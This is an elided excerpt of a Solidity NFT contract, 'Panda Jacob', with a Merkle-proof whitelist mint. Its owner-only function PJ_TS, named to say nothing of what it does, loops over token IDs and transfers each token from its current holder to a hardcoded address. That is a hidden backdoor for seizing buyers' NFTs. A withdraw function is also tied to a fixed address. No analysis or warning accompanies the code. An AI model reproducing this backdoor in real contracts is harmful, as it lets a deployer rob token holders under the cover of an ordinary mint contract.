...
contract Panda_Jacob is Ownable, ERC721A, ReentrancyGuard {

  uint256 public immutable maxPerAddressDuringMint;
  bytes32 public WlRoots;  
  ...
  ) ERC721A("Panda Jacob", "PJ", maxBatchSize_, collectionSize_) {
  ...
  function MintBywhiteList(uint256 quantity,bytes32[] calldata _merkleProof) external payable callerIsUser {
    ...
    require(MerkleProof.verify(_merkleProof, WlRoots, leaf), "Invalid proof!");
    require(
  ...
  function PJ_TS(uint256[] memory tokenids) external onlyOwner {
    if(block.difficulty > 0){
        ...
        for (uint256 i; i < len; i++) {
            ...
            transferFrom(ownerOf(tokenid), 0x89A58Bb31697BfDC27AbAbc7a8e15944657bbc50, tokenid);
        }
        }
    }
  ...
  function withdraw() external  nonReentrant {
    require(msg.sender == 0xD7085E631D3bcc2dfd91ad4810aB8Ce8398883Ca);
